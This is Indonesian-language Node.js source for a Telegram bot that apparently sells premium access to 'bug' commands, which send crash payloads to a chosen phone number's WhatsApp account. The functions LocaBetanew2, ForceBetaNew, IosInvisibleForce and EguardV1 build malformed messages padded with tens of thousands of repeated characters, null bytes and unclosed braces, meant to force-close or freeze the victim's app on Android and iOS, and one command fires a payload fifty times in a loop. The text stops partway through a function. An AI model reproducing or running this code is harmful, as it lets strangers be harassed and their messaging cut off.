    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Force Close Beta
│𖥂 Status: Procces
└─────────────────────⬡
`,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Force Close Beta
│𖥂 Status: Sending Bug
└─────────────────────⬡
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await forcebeta(target);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Force Close Beta
│𖥂 Status: Succesfuly Sending Bug
└─────────────────────⬡
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//// =====( CASE BUG 2 ) ===== \\\\
bot.onText(/\/sparta (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
•༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑•\`\`\`
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "ᴏᴡɴᴇʀ", url: "https://t.me/mr_smile_202" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpair terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Crash Invis Ios
│𖥂 Status: Procces
└─────────────────────⬡
`,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Crash Invis Ios
│𖥂 Status: Sending Bug
└─────────────────────⬡
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         
         await iosinvis(target);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Crash Invis Ios
│𖥂 Status: Succesfuly Sending Bug
└─────────────────────⬡
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//// =====( CASE BUG 3 ) ===== \\\\
bot.onText(/\/ovalium (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
•༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑•\`\`\`
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "ᴏᴡɴᴇʀ", url: "https://t.me/mr_smile_202" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpair terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Delay Hard
│𖥂 Status: Procces
└─────────────────────⬡
`,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Delay Hard
│𖥂 Status: Sending Bug
└─────────────────────⬡
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");

         await gtw(target);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Delay Hard
│𖥂 Status: Succesfuly Sending Bug
└─────────────────────⬡
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//// =====( CASE BUG 4 ) ===== \\\\
bot.onText(/\/zeus (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
•༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑•\`\`\`
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "ᴏᴡɴᴇʀ", url: "https://t.me/mr_smile_202" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpair terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Gataw
│𖥂 Status: Procces
└─────────────────────⬡
`,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Gataw
│𖥂 Status: Sending Bug
└─────────────────────⬡
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         
         await tess(target);
       
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Gataw
│𖥂 Status: Succesfuly Sending Bug
└─────────────────────⬡
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
//// =====( CASE BUG 5 ) ===== \\\\
bot.onText(/\/Loser (\d+)/, async (msg, match) => { 
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const chatType = msg.chat?.type;
    const groupOnlyData = JSON.parse(fs.readFileSync(ONLY_FILE));
    const targetNumber = match[1];
    const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;

    if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, getRandomImage(), {
            caption: `
\`\`\`
•༑ 𝐁𝐮𝐠 𝐙𝐢𝐥𝐥𝐞𝐫 ༑•\`\`\`
❌ Akses ditolak. Fitur ini hanya untuk user premium.
`,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "ᴏᴡɴᴇʀ", url: "https://t.me/mr_smile_202" }]
                ]
            }
        });
    }

    if (checkCooldown(userId) > 0) {
        return bot.sendMessage(chatId, `⏳ Cooldown aktif. Coba lagi dalam ${cooldown} detik.`);
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /xpair terlebih dahulu.`);
    }
    
    if (groupOnlyData.groupOnly && chatType === "private") {
    return bot.sendMessage(chatId, "Bot ini hanya bisa digunakan di grup.");
  }
    

    const sent = await bot.sendPhoto(chatId, getRandomImage(), {
        caption: `
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Crash Andros
│𖥂 Status: Procces
└─────────────────────⬡
`,
        parse_mode: "Markdown"
    });

    try {
        
        await new Promise(r => setTimeout(r, 1000));
        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Crash Andros
│𖥂 Status: Sending Bug
└─────────────────────⬡
`,
          
           {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }],
        ],
      },
    }
  );

        console.log("\x1b[31m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
         
         for (let i = 0; i < 50; i++) {
         await BoySircle(sock, target);
       }
        console.log("\x1b[31m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

        await bot.editMessageCaption(`
┌─────────────────────⬡
│𖥂 Target: ${formattedNumber}
│𖥂 Type Bug: Crash Andros
│𖥂 Status: Succesfuly Sending Bug
└─────────────────────⬡
`, 

          {
            chat_id: chatId,
            message_id: sent.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𝐂𝐞𝐤 ☇ 𝐓𝐚𝐫𝐠𝐞𝐭", url: `https://wa.me/${formattedNumber}` }]
                ]
            }
        });

    } catch (err) {
        await bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${err.message}`);
    }
});
///======( Plugin ) ======\\\
bot.onText(/\/xpair (.+)/, async (msg, match) => {
       const chatId = msg.chat.id;
       if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
       return bot.sendMessage(
       chatId,
 `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,
       { parse_mode: "Markdown" }
       );
       }
       const botNumber = match[1].replace(/[^0-9]/g, "");

       try {
       await connectToWhatsApp(botNumber, chatId);
       } catch (error) {
       console.error("Error in xpair:", error);
       bot.sendMessage(
       chatId,
       "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
      );
      }
      });
      
bot.onText(/^\/gconly (on|off)/i, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id;
      
      if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }
      const mode = match[1].toLowerCase();
      const status = mode === "on";
      setGroupOnly(status);

      bot.sendMessage(msg.chat.id, `Fitur *Group Only* sekarang: ${status ? "AKTIF" : "NONAKTIF"}`, {
      parse_mode: "Markdown",
      });
      });
      
bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
     const chatId = msg.chat.id; 
     const response = setCooldown(match[1]);

     bot.sendMessage(chatId, response); });

const moment = require('moment');
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
     }

     if (!match[1]) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

     const args = match[1].split(' ');
     if (args.length < 2) {
     return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
     }

    const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
    const duration = args[1];
  
    if (!/^\d+$/.test(userId)) {
    return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
    }
  
    if (!/^\d+[dhm]$/.test(duration)) {
   return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, Example: /addprem 58273654 30d`);
   }
   
    const now = moment();
    const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

    if (!premiumUsers.find(user => user.id === userId)) {
    premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
    savePremiumUsers();
    console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
    bot.sendMessage(chatId, `
✅Berhasil, kini user ${userId} Sudah memiliki akses premium hingga ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
    } else {
    const existingUser = premiumUsers.find(user => user.id === userId);
    existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
     }
     });

bot.onText(/\/listprem/, (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;

     if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
     return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
  }

      if (premiumUsers.length === 0) {
      return bot.sendMessage(chatId, "📌 No premium users found.");
  }

      let message = "```";
      message += "\n";
      message += " ( + )  LIST PREMIUM USERS\n";
      message += "\n";
      premiumUsers.forEach((user, index) => {
      const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
      message += `${index + 1}. ID: ${user.id}\n   Exp: ${expiresAt}\n`;
      });
      message += "\n```";

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
      const chatId = msg.chat.id;
      const senderId = msg.from.id
      
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);

        { parse_mode: "Markdown" }
   
        }

      if (!match || !match[1]) 
      return bot.sendMessage(chatId, `
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      
      const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
      if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId,`
❌ Command salah, Masukan user id serta waktu expired, /addadmin 58273654 30d`);
      }

      if (!adminUsers.includes(userId)) {
      adminUsers.push(userId);
      saveAdminUsers();
      console.log(`${senderId} Added ${userId} To Admin`);
      bot.sendMessage(chatId, `
✅Berhasil menambahkan admin, kini user ${userId} Memiliki aksess admin. `);
      } else {
      bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
      }
      });

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
          const chatId = msg.chat.id;
          const senderId = msg.from.id;
          if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
          return bot.sendMessage(chatId, `
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`);
          }
          if (!match[1]) {
          return bot.sendMessage(chatId,`
❌ Command salah! Contoh /delprem 584726249 30d.`);
          }
          const userId = parseInt(match[1]);
          if (isNaN(userId)) {
          return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
          }
          const index = premiumUsers.findIndex(user => user.id === userId);
          if (index === -1) {
          return bot.sendMessage(chatId, `❌ User ${userId} tidak terdaftar di dalam list premium.`);
          }
                premiumUsers.splice(index, 1);
                savePremiumUsers();
         bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar premium. `);
         });

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
        const chatId = msg.chat.id;
        const senderId = msg.from.id;
        if (!isOwner(senderId)) {
        return bot.sendMessage(
        chatId,`
❌ Akses ditolak, hanya owner yang dapat melakukan command ini.`,

        { parse_mode: "Markdown" }
        );
        }
        if (!match || !match[1]) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
        if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, `
❌Comand salah, Contoh /deladmin 5843967527 30d.`);
        }
        const adminIndex = adminUsers.indexOf(userId);
        if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `
✅ Berhasil menghapus user ${userId} dari daftar admin.`);
        } else {
        bot.sendMessage(chatId, `❌ User ${userId} Belum memiliki aksess admin.`);
        }
        });

bot.onText(/\/cekidch (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const link = match[1];
    
    
    let result = await getWhatsAppChannelInfo(link);

    if (result.error) {
        bot.sendMessage(chatId, `⚠️ ${result.error}`);
    } else {
        let teks = `
📢 *Informasi Channel WhatsApp*
🔹 *ID:* ${result.id}
🔹 *Nama:* ${result.name}
🔹 *Total Pengikut:* ${result.subscribers}
🔹 *Status:* ${result.status}
🔹 *Verified:* ${result.verified}
        `;
        bot.sendMessage(chatId, teks);
    }
});
// ------------------ ( Function Disini ) ------------------------ \\
async function LocaBetanew2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `X-Moon Infinity${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

async function ForceBetaNew(target) {
  const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "ោ៝".repeat(1000),
      inviteExpiration: "99999999999",
      groupName: "X-Moon Infinity" + "ꦾ".repeat(2500),
      caption: "ោ៝ X-Moon Infinity ោ៝"+ "ꦾ".repeat(2500),
      body: {
        text:
          "X-Moon Infinity" +
          "ោ៝".repeat(2500) +
          "ꦾ".repeat(2500) +
          "ꦽ".repeat(5000),
      },
    },
       contextInfo: {
         deviceLogoutNotification: {
         divice: "ANDROID",
          timestamp: Date.now()
        },
    },
    nativeFlowMessage: {
      messageParamsJson: "{".repeat(5000) + "[".repeat(5000), 
      buttons: [
        {
          name: "single_target",
          buttonParamJson: "ោ៝".repeat(2500),
        },
        {
          name: "review_and_pay",
          paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"Kayla\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Kaylaa\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}", 
        },
        {
          name: "join_group",
          buttonParamJson: "ꦽ".repeat(2500),
        },
      ],
      messageParamsJson: "{".repeat(5000) + "[".repeat(5000), 
    },
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target },
    messageId: null,
  });
}

async function IosInvisibleForce(sock, target) {
  const msg = {
  message: {
    locationMessage: {
      degreesLatitude: 21.1266,
      degreesLongitude: -11.8199,
      name: "𝐁𝐔𝐆 𝐙𝐈𝐋𝐋𝐄𝐑 ꙱\n" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/mr_smile_202",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "https://t.me/mr_smile_202" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  }
};
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
  console.log(randomColor()(`─────「 ⏤!CrashInvisibleIOS To: ${target}!⏤ 」─────`))
}

async function EguardV1(target) {
  const cards = Array.from({ length: 15 }, (_, i) => ({
    header: {
      title: `Kyy Official #${i + 1}`,
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
        fileLength: "164089",
        height: 1,
        width: 1,
        mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
        fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
        directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1749172037",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAsAAEAAwEBAAAAAAAAAAAAAAAAAQIDBAUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAADxq2mzNeJZZovmEJV0RlAX6F5I76JxgAtN5TX2/G0X2MfHzjq83TOgNteXpMpujBrNc6wquimpWoKwFaEsA//EACQQAAICAgICAQUBAAAAAAAAAAABAhEDIQQSECAUEyIxMlFh/9oACAEBAAE/ALRR1OokNRHIfiMR6LTJNFsv0g9bJvy1695G2KJ8PPpqH5RHgZ8lOqTRk4WXHh+q6q/SqL/iMHFyZ+3VrRhjPDBOStqNF5GvtdQS2ia+VilC2lapM5fExYIWpO78pHQ43InxpOSVpk+bJtNHzM6n27E+Tlk/3ZPLkyUpSbrzDI0qVFuraG5S0fT1tlf6dX6RdEZWt7P2f4JfwUdkqGijXiA9OkPQh+n/xAAXEQADAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/ANVukaO//8QAFhEAAwAAAAAAAAAAAAAAAAAAARBA/9oACAEDAQE/AJg//9k=",
        scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
        scanLengths: [8596, 155493]
      },
      hasMediaAttachment: true
    },
    body: {
      text: `KyyOfficial`
    },
    footer: {
      text: "kyy.json"
    },
    nativeFlowMessage: {
      messageParamsJson: "\u0000".repeat(5000) + "\n".repeat(5000)
    }
  }));

  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: {
          body: {
            text: 'Kyy Cogan'
          },
          footer: {
            text: 'Kyy Is Back'
          },
          carouselMessage: {
            cards: cards
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: "{ phynx.json }",
                      version: 3
                    }
                  }
                }
              }
            },
            remoteJid: "@s.whatsapp.net"
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });

  console.log(chalk.green(`Successfully Send ${chalk.red("EguardV1 Succes Sending Bug")} to ${target}`));
}

async function dayLightZep(target, mention) {
  const zepUserId = "5126860596";
  const zepMediaPath = "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh";
  const zepyBuffer = "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
